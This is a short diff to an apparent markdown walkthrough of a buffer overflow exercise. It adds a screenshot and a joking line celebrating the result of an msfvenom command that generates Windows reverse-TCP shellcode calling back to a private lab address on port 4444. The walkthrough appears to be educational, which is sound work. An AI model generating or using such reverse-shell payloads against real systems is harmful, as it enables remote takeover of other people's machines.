@@ -909,7 +909,14 @@ while True:
     
     - **Command:**
     
-    - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86`**   
+    - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86`**
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169420034-c07e6bb4-0a16-43a2-b9cd-9df89e056962.png)
+
+    - **BOOM!!! We just have generated `THE SHELLCODE` (++++ [Oración al shellcode, in nomine dei nostri luciferi excelsi](https://www.youtube.com/watch?v=i2hYz15Rab4) ++++)
+
+
+   
 
         
 
